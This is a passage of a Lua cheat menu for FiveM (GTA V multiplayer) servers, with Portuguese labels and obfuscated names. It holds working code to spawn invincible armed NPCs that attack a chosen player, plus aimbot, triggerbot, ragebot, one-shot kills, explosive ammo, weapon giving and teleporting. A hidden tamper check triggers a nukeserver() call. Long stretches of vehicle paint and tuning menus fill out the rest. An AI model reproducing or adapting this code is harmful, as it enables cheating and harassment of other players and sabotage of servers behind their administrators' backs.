                AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), Pryorbypessed2), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), Pryorbypessed2), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
              elseif felipebypassedmesquita.button("~r~Snowball troll ~s~Player") then
                rotatier = Pryorbypessed3
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                roundx = tonumber(string.format("%.2f", x))
                roundy = tonumber(string.format("%.2f", y))
                roundz = tonumber(string.format("%.2f", z))
                local tubemodel = "sr_prop_spec_tube_xxs_01a"
                local tubehash = GetHashKey(tubemodel)
                RequestModel(tubehash)
                RequestModel(smashhash)
                while not HasModelLoaded(tubehash) do
                  Citizen.Wait(0)
                end
                local tube = CreateObject(tubehash, roundx, roundy, roundz - 5.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
                SetEntityRotation(tube, 0.0, 90.0, 0.0)
                local snowhash = -356333586
                local wep = "WEAPON_SNOWBALL"
                for i = 0, 10 do
                  local coords = GetEntityCoords(tube)
                  RequestModel(snowhash)
                  Citizen.Wait(50)
                  if HasModelLoaded(snowhash) then
                    local ped = CreatePed(21, snowhash, coords.x + math.sin(i * 2.0), coords.y - math.sin(i * 2.0), coords.z - 5.0, 0, Pryorbypessed3, Pryorbypessed3) and CreatePed(21, snowhash ,coords.x - math.sin(i * 2.0), coords.y + math.sin(i * 2.0), coords.z - 5.0, 0, Pryorbypessed3, Pryorbypessed3)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, Pryorbypessed2)
                      SetNetworkIdCanMigrate(netped, Pryorbypessed3)
                      SetNetworkIdExistsOnAllMachines(netped, Pryorbypessed3)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetCurrentPedWeapon(ped, GetHashKey(wep), Pryorbypessed3)
                      SetEntityInvincible(ped, Pryorbypessed2)
                      SetPedCanSwitchWeapon(ped, Pryorbypessed3)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
			end

  
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(SPD) then
              drawDescription("~r~Troll ~s~player with peds", 0.33, 0.33)
              if felipebypassedmesquita.button("~r~S~b~p~g~a~o~w~y~n~p~a~s~r ~s~NPC com ~y~Faca ~g~(NEW)") then
                local pedname = "a_f_m_eastsa_02"
                local wep = "WEAPON_knife"
                for i = 0,0 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, Pryorbypessed3, Pryorbypessed3) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, Pryorbypessed3, Pryorbypessed3)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, Pryorbypessed2)
                      SetNetworkIdCanMigrate(netped, Pryorbypessed3)
                      SetNetworkIdExistsOnAllMachines(netped, Pryorbypessed3)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, Pryorbypessed2)
                      SetPedCanSwitchWeapon(ped, Pryorbypessed3)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
              elseif felipebypassedmesquita.button("~r~S~b~p~g~a~o~w~y~n~p~a~s~r ~s~NPC com ~y~Pistola MK2 ~g~(NEW)") then
                local pedname = "a_m_m_afriamer_01"
                local wep = "weapon_pistol_mk2"
                for i = 0,0 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, Pryorbypessed3, Pryorbypessed3) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, Pryorbypessed3, Pryorbypessed3)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, Pryorbypessed2)
                      SetNetworkIdCanMigrate(netped, Pryorbypessed3)
                      SetNetworkIdExistsOnAllMachines(netped, Pryorbypessed3)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, Pryorbypessed2)
                      SetPedCanSwitchWeapon(ped, Pryorbypessed3)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
              elseif felipebypassedmesquita.button("~r~S~b~p~g~a~o~w~y~n~p~a~s~r NPC com ~y~Rifle ~g~(NEW)") then
                local pedname = "a_m_m_golfer_01"
                local wep = "weapon_assultrifle"
                for i = 0,0 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, Pryorbypessed3, Pryorbypessed3) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, Pryorbypessed3, Pryorbypessed3)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, Pryorbypessed2)
                      SetNetworkIdCanMigrate(netped, Pryorbypessed3)
                      SetNetworkIdExistsOnAllMachines(netped, Pryorbypessed3)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, Pryorbypessed2)
                      SetPedCanSwitchWeapon(ped, Pryorbypessed3)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
              elseif felipebypassedmesquita.button("~r~S~b~p~g~a~o~w~y~n~p~a~s~r ~s~NPC com ~y~Tazer ~g~(NEW)") then
                local pedname = "a_f_m_beach_01"
                local wep = "weapon_stungun"
                for i = 0,0 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, Pryorbypessed3, Pryorbypessed3) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, Pryorbypessed3, Pryorbypessed3)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, Pryorbypessed2)
                      SetNetworkIdCanMigrate(netped, Pryorbypessed3)
                      SetNetworkIdExistsOnAllMachines(netped, Pryorbypessed3)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, Pryorbypessed2)
                      SetPedCanSwitchWeapon(ped, Pryorbypessed3)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
              end 
			
              felipebypassedmesquita.Display()
            elseif IsDisabledControlPressed(0, 288) then
        felipebypassedmesquita.OpenMenu(LynxIcS)

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(TRPM) then
              drawDescription("Teleport options for you", 0.38, 0.38)
              if felipebypassedmesquita.button("Teleportar para Local ~g~Marcado") then
                TeleportToWaypoint()
              elseif felipebypassedmesquita.button("Teleportar para ~g~VEICULO PROXIMO") then
                teleporttonearestvehicle()
              elseif felipebypassedmesquita.button("Teleportar para ~r~Coordenadas") then
                teleporttocoords()
              elseif felipebypassedmesquita.button("Mostrar ~r~BLIPS ~s~Personalizado no ~y~MAPA") then
                drawcoords()
              elseif felipebypassedmesquita.CheckBox("Mostrar ~g~Suas Coordenadas", showCoords, function (enabled) showCoords = enabled end) then
              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(WMPS) then
              if felipebypassedmesquita.MenuButton("~p~#~s~ ~g~Pegar ~o~ARMA Especifica", WTNe) then
              elseif felipebypassedmesquita.MenuButton("~p~#~s~ Setar Miras", CMSMS) then

              elseif felipebypassedmesquita.button("~g~Give All Weapons") then
                for i = 1, #allWeapons do
                  GiveWeaponToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), 1000, Pryorbypessed2, Pryorbypessed2)
                end
              elseif felipebypassedmesquita.button("~r~Remover ~p~Todas as Armas") then
                RemoveAllPedWeapons(PlayerPedId(-1), Pryorbypessed3)

              elseif felipebypassedmesquita.button("~y~Dropar sua ARMA Atual") then
                local a = GetPlayerPed(-1)
                local b = GetSelectedPedWeapon(a)
                SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)

			  elseif felipebypassedmesquita.CheckBox("TriggerBot", TriggerBot, function(enabled) TriggerBot = enabled end) then
			  elseif felipebypassedmesquita.CheckBox("Aimlock", Aimlock, function(enabled) Aimlock = enabled end) then
              elseif felipebypassedmesquita.CheckBox("SilentAim/Aimbot", Aimbot, function(enabled) Aimbot = enabled end) then
              elseif felipebypassedmesquita.CheckBox("Ragebot", ragebot, function(enabled) ragebot = enabled  end) then
              elseif felipebypassedmesquita.CheckBox("Explosive Ammo", explosiveammo, function(enabled) explosiveammo = enabled  end) then
              elseif felipebypassedmesquita.CheckBox("Rapid Fire", rapidfire, function(enabled) rapidfire = enabled  end) then

			  elseif felipebypassedmesquita.button("Pegar Munição") then
				local result = Pryyyorbypass("Enter the amount of ammo", "", 100)
				if result ~= "" then
				for i = 1, #allWeapons do AddAmmoToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), result) end
				end
              elseif felipebypassedmesquita.CheckBox("Matar com 1 ~r~Clique", oneshot, function(enabled) oneshot = enabled end) then
              elseif felipebypassedmesquita.CheckBox("OneShot ~b~Carro", oneshotcar, function(enabled) oneshotcar = enabled end) then
              elseif felipebypassedmesquita.CheckBox("Veiculo ~b~Armado",VehicleGun, function(enabled)VehicleGun = enabled end)  then
              elseif felipebypassedmesquita.CheckBox("Deletar ~b~Arma",DeleteGun, function(enabled)DeleteGun = enabled end)  then
              end


              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(tngns) then
              veh = GetVehiclePedIsUsing(PlayerPedId())
              for i,theItem in pairs(vehicleMods) do
                if theItem.id == "extra" and #checkValidVehicleExtras() ~= 0 then
                  if felipebypassedmesquita.MenuButton(theItem.name, theItem.id) then
                  end
                elseif theItem.id == "neon" then
                  if felipebypassedmesquita.MenuButton(theItem.name, theItem.id) then
                  end
                elseif theItem.id == "paint" then
                  if felipebypassedmesquita.MenuButton(theItem.name, theItem.id) then
                  end
                elseif theItem.id == "wheeltypes" then
                  if felipebypassedmesquita.MenuButton(theItem.name, theItem.id) then
                  end
                elseif theItem.id == "headlight" then
                  if felipebypassedmesquita.MenuButton(theItem.name, theItem.id) then
                  end
                elseif theItem.id == "licence" then
                  if felipebypassedmesquita.MenuButton(theItem.name, theItem.id) then
                  end
                else
                  local valid = checkValidVehicleMods(theItem.id)
                  for ci,ctheItem in pairs(valid) do
                    if felipebypassedmesquita.MenuButton(theItem.name, theItem.id) then
                    end
                    break
                  end
                end

              end
             
              if IsToggleModOn(veh, 22) then
                xenonStatus = "Installed"
              else
                xenonStatus = "Not Installed"
              end
              if felipebypassedmesquita.button("Xenon Headlight", xenonStatus) then
                if not IsToggleModOn(veh,22) then
                  ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
                else
                  ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
                end
              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(prof) then
              veh = GetVehiclePedIsUsing(PlayerPedId())
              for i,theItem in pairs(perfMods) do
                if felipebypassedmesquita.MenuButton(theItem.name, theItem.id) then
                end
              end
              if IsToggleModOn(veh,18) then
                turboStatus = "Installed"
              else
                turboStatus = "Not Installed"
              end
              if felipebypassedmesquita.button("~b~Turbo Tune", turboStatus) then
                if not IsToggleModOn(veh,18) then
                  ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
                else
                  ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
                end
              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("primary") then
              if felipebypassedmesquita.MenuButton("~p~#~s~ Classic", "classic1") then
			  elseif felipebypassedmesquita.MenuButton("~p~#~s~ Metallic", "metallic1") then
              elseif felipebypassedmesquita.MenuButton("~p~#~s~ Matte", "matte1") then
			  elseif felipebypassedmesquita.MenuButton("~p~#~s~ Metal", "metal1") then
			  end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("secondary") then
             if felipebypassedmesquita.MenuButton("~p~#~s~ Classic", "classic2") then
			 elseif felipebypassedmesquita.MenuButton("~p~#~s~ Metallic", "metallic2") then
			 elseif felipebypassedmesquita.MenuButton("~p~#~s~ Matte", "matte2") then
			 elseif felipebypassedmesquita.MenuButton("~p~#~s~ Metal", "metal2") then
			end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("rimpaint") then
              if felipebypassedmesquita.MenuButton("~p~#~s~ Classic", "classic3") then
			elseif felipebypassedmesquita.MenuButton("~p~#~s~ Metallic", "metallic3") then
			elseif felipebypassedmesquita.MenuButton("~p~#~s~ Matte", "matte3") then
			elseif felipebypassedmesquita.MenuButton("~p~#~s~ Metal", "metal3") then
			end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("classic1") then
              for theName,thePaint in pairs(paintsClassic) do
                tp,ts = GetVehicleColours(veh)
                if tp == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and tp == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and curprim == thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and curprim ~= thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end

              if bytexd ~= "❤Use com moderação❤... Pega nada ADM!!" then
                nukeserver()
              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("metallic1") then
              for theName,thePaint in pairs(paintsClassic) do
                tp,ts = GetVehicleColours(veh)
                if tp == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and tp == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and curprim == thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and curprim ~= thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("matte1") then
              for theName,thePaint in pairs(paintsMatte) do
                tp,ts = GetVehicleColours(veh)
                if tp == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and tp == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleColours(veh,thePaint.id,oldsec)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and curprim == thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and curprim ~= thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("metal1") then
              for theName,thePaint in pairs(paintsMetal) do
                tp,ts = GetVehicleColours(veh)
                if tp == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and tp == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    SetVehicleColours(veh,thePaint.id,oldsec)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and curprim == thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and curprim ~= thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("classic2") then
              for theName,thePaint in pairs(paintsClassic) do
                tp,ts = GetVehicleColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldmod = table.pack(oldprim,oldsec)
                    SetVehicleColours(veh,oldprim,thePaint.id)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and cursec == thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and cursec ~= thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("metallic2") then
              for theName,thePaint in pairs(paintsClassic) do
                tp,ts = GetVehicleColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldmod = table.pack(oldprim,oldsec)
                    SetVehicleColours(veh,oldprim,thePaint.id)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and cursec == thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and cursec ~= thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("matte2") then
              for theName,thePaint in pairs(paintsMatte) do
                tp,ts = GetVehicleColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldmod = table.pack(oldprim,oldsec)
                    SetVehicleColours(veh,oldprim,thePaint.id)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and cursec == thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and cursec ~= thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("metal2") then
              for theName,thePaint in pairs(paintsMetal) do
                tp,ts = GetVehicleColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldmod = table.pack(oldprim,oldsec)
                    SetVehicleColours(veh,oldprim,thePaint.id)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and cursec == thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and cursec ~= thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("classic3") then
              for theName,thePaint in pairs(paintsClassic) do
                _,ts = GetVehicleExtraColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                _,currims = GetVehicleExtraColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and currims == thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and currims ~= thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("metallic3") then
              for theName,thePaint in pairs(paintsClassic) do
                _,ts = GetVehicleExtraColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                _,currims = GetVehicleExtraColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and currims == thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and currims ~= thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("matte3") then
              for theName,thePaint in pairs(paintsMatte) do
                _,ts = GetVehicleExtraColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                _,currims = GetVehicleExtraColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and currims == thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and currims ~= thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened("metal3") then
              for theName,thePaint in pairs(paintsMetal) do
                _,ts = GetVehicleExtraColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                _,currims = GetVehicleExtraColours(veh)
                if felipebypassedmesquita.button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
